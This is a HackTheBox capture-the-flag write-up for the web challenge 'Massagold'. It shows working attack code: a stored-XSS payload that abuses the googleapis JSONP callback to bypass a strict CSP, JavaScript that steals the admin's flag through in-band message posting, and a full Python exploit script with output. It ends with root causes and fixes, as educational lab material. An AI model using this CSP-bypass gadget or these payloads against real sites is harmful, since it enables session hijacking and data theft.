# Massagold — Web — HTB

**Flag:** `HTB{m3554g3_1n_7h3_cu570dy_ch41n_afa362789ccbaf33b7802f5d1516cc89}`

**TL;DR:** Stored XSS in a letter-viewing page, gated behind a strict CSP whose only external
script source is `https://www.googleapis.com`. Abuse the `customsearch/v1` JSONP endpoint
(which reflects the `callback` value verbatim into an executed script body) to run arbitrary JS
in the admin bot's session. Because every exfil channel is locked to `'self'`, the flag is
stolen *in-band*: the injected JS reads the admin's flag letter and posts it back to your own
account as a new message, which you then read.

---

## 1. Recon

The app is a medieval "raven mail" messaging service (Express + EJS + SQLite). Key routes
(`routes.js`):

```
GET  /                 inbox            (auth)
GET  /messages/new     compose          (auth)
POST /messages         send a letter    (auth)
GET  /messages/:id     read a letter    (auth)
POST /register /login /logout
```

An **admin bot** (`bot/bot.js`, Playwright/Firefox) logs in as `admin` and visits
`/messages/<id>` **only when you send a letter to `admin`** (`messageController.sendMessage`):

```js
if (recipient.username === 'admin') {
  enqueueMessageVisit(result.lastID);
}
```

So we have a classic bot-driven XSS setup: get the bot to view our letter, run JS as admin.

### Where the flag lives

`entrypoint.js` seeds the DB on boot. The flag is inserted as **the very first message**
(`id = 1`), sent from `archivist` → `admin`:

```js
await createMessage(
  users.archivist, users.admin,
  `Archive notice:\n\nThe sealed royal record reads:\n${flag}`
);
```

`showMessage` enforces `WHERE messages.id = ? AND messages.recipient_id = ?` against the
session user, so **only admin can read `/messages/1`**. No IDOR — we must act *as* admin.

---

## 2. The XSS sink

`views/message.ejs` renders the letter body with EJS **unescaped** output (`<%-`):

```ejs
<pre class="letter-copy"><%- message.content %></pre>
```

`message.content` is fully attacker-controlled (it's the letter we send). That's a stored XSS —
raw HTML injection into the admin's page.

---

## 3. The wall: Content-Security-Policy

`server.js` sets a strict CSP on every response:

```
default-src 'self'
script-src  'self' https://www.googleapis.com
style-src   'self'
img-src     'self' data:
font-src    'self' data:
connect-src 'self'
object-src  'none'
form-action 'self'
frame-ancestors 'none'
```

Consequences:

- **No inline scripts / event handlers** — no `unsafe-inline`, so `<img onerror=…>`,
  `<script>…</script>`, `javascript:` URIs are all dead.
- **No same-origin JS hosting** — the app never returns attacker-controlled `text/javascript`,
  and loading an HTML page as a script (`<script src="/messages/…">`) just throws a parse error
  on `<!doctype html>`.
- **Only external script origin is `https://www.googleapis.com`.** That whitelist is the entire
  challenge.
- **Every exfil channel is `'self'`:** `connect-src`, `img-src`, and `form-action` are all
  same-origin. There is *no* way to beacon the flag to an external server. Exfil must happen
  inside the app.

---

## 4. Bypassing CSP via the googleapis JSONP endpoint

`www.googleapis.com` hosts a JSONP endpoint at `customsearch/v1`. Request it with a `callback`
and it echoes that value into a JavaScript response:

```
GET https://www.googleapis.com/customsearch/v1?callback=CALLBACK
```
```javascript
// API callback
CALLBACK({ ... json ... });
```

Two important facts:

1. **The callback is reflected verbatim.** Modern Google endpoints *claim* to validate the
   callback ("only alphabet, number, `_`, `$`, `.`, `[`, `]` are allowed") and return a 400,
   **but they still emit the raw callback into the response body**. You can confirm this — the
   body for `callback=alert(1)` is literally `alert(1)({...})`, which pops the alert. The
   disallowed `(` was reflected regardless.
2. **Browsers execute `<script src>` bodies even on HTTP 400**, as long as the content type is
   script-like (it's `text/javascript`).

So `www.googleapis.com/customsearch/v1?callback=<ARBITRARY_JS>` gives **arbitrary JS execution**
under a CSP-approved origin — not just SOME (Same-Origin Method Execution), full code.

Wrap the payload as an IIFE so the trailing `({...})` in the response simply invokes it with the
(ignored) JSON error object as its argument:

```js
callback = (function(x){ /* our code */ })
// response becomes:  (function(x){ ... })({ ...json... });   <-- clean, runs our code
```

### Quick manual proof (recommended before automating)

Send a letter **to yourself**, open it, click the wax seal:

```html
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)"></script>
```

If the alert fires, the bypass works on this instance.

---

## 5. In-band exfiltration

With code execution as admin, and all external channels blocked, we use the app itself as the
exfil channel:

1. Register an attacker account, e.g. `pwn` (the recipient **must exist** before admin posts to
   it, or `sendMessage` 404s).
2. The injected JS, running as admin:
   - `fetch('/messages/1')` — same-origin, admin's cookies attached → reads the flag letter.
   - Extracts `HTB{...}` with a regex.
   - `fetch('/messages', {method:'POST', ...})` with `to_username=pwn&content=<flag>` —
     same-origin POST, allowed by `connect-src 'self'`; sends a new letter to us.
   - (Sending to `pwn`, not `admin`, so it does **not** re-trigger the bot — no loop.)
3. Log in as `pwn`, read the inbox, pull the flag.

### Final letter body (the stored-XSS payload)

```html
<script src="https://www.googleapis.com/customsearch/v1?callback=<URL-ENCODED IIFE>"></script>
```

where the IIFE (before encoding) is:

```js
(function(x){
  fetch('/messages/1')
    .then(function(r){ return r.text(); })
    .then(function(t){
      var m = t.match(/HTB\{[^}]*\}/);
      fetch('/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'to_username=pwn&content=' + encodeURIComponent(m ? m[0] : t)
      });
    });
})
```

---

## 6. Manual walkthrough (no script)

1. **Register** `pwn` / any password (auto-logs you in).
2. **Compose** a letter to `admin`. In the letter body paste the
   `<script src="https://www.googleapis.com/customsearch/v1?callback=…">` payload above.
   (The compose box is a `contenteditable`; if the markup gets mangled, submit the `content`
   form field directly — see the automated script, which POSTs it cleanly.)
3. **Send.** This queues the admin bot to visit your letter.
4. Wait ~5–15 s for the bot. The bot's Firefox loads your letter → the googleapis script runs as
   admin → reads `/messages/1` → posts the flag to `pwn`.
5. **Refresh your inbox** (`/`). A new letter from `admin` appears. Open it — it contains the flag.

---

## 7. Automated exploit

```python
#!/usr/bin/env python3
import sys, re, time, urllib.parse, requests

BASE = sys.argv[1].rstrip('/')
ATTACKER, PASSWORD = 'pwn', 'pwnpwnpwn123'

JS = (
    "(function(x){"
    "fetch('/messages/1').then(function(r){return r.text()}).then(function(t){"
    "var m=t.match(/HTB\\{[^}]*\\}/);"
    "fetch('/messages',{method:'POST',"
    "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
    "body:'to_username=" + ATTACKER + "&content='+encodeURIComponent(m?m[0]:t)})"
    "})})"
)
JSONP = "https://www.googleapis.com/customsearch/v1?callback=" + urllib.parse.quote(JS, safe='')
PAYLOAD = '<script src="%s"></script>' % JSONP
FLAG_RE = re.compile(r'HTB\{[^}]*\}')

def auth(s):
    if s.post(f'{BASE}/register', data={'username':ATTACKER,'password':PASSWORD},
              allow_redirects=False).status_code in (302,303):
        return
    s.post(f'{BASE}/login', data={'username':ATTACKER,'password':PASSWORD},
           allow_redirects=False)

def main():
    s = requests.Session()
    auth(s)
    s.post(f'{BASE}/messages', data={'to_username':'admin','content':PAYLOAD},
           allow_redirects=False)
    print('[+] letter delivered to admin; waiting for bot...')
    for _ in range(40):
        inbox = s.get(f'{BASE}/').text
        for mid in sorted({int(x) for x in re.findall(r'/messages/(\d+)', inbox)}, reverse=True):
            m = FLAG_RE.search(s.get(f'{BASE}/messages/{mid}').text)
            if m:
                print('[+] FLAG:', m.group(0)); return
        time.sleep(2)
    print('[-] no flag yet — re-run (bot queue may lag)')

if __name__ == '__main__':
    main()
```

Run:

```bash
python3 exploit.py http://<INSTANCE_IP>:<PORT>
```

```
[+] letter delivered to admin; waiting for bot...
[+] FLAG: HTB{m3554g3_1n_7h3_cu570dy_ch41n_afa362789ccbaf33b7802f5d1516cc89}
```

> **Note on instances:** HTB docker instances rotate `IP:port` and reset state on respawn. A
> `404` on `/register` / `/login` usually means the instance is stale — respawn and use the new
> address. `pwn` is hard-coded in the payload; if that name is taken by another player's solve,
> change `ATTACKER` in both the script and the inlined JS.

---

## 8. Root causes & fixes

| Bug | Fix |
|---|---|
| Unescaped EJS output `<%- message.content %>` | Use escaped `<%= %>`, or sanitize/encode letter bodies. |
| CSP whitelists `https://www.googleapis.com` | Drop it — it hosts a JSONP endpoint that reflects arbitrary callbacks. Prefer nonces/hashes over host allowlists. |
| In-band exfil possible despite strict `connect-src` | CSP can't stop same-origin abuse once JS runs; the real fix is preventing the XSS in the first place. |

**Key lesson:** a strict CSP that still allowlists a Google host is not strict. `*.googleapis.com`
(and friends like `ajax.googleapis.com`, `translate.googleapis.com`, `www.google.com`) host JSONP
and library gadgets that turn "script-src 'self' + one Google domain" into arbitrary execution.
And locking every exfil channel to `'self'` doesn't save you — if the attacker's code runs in a
privileged session, the application's own features (here, sending a message) become the exfil path.
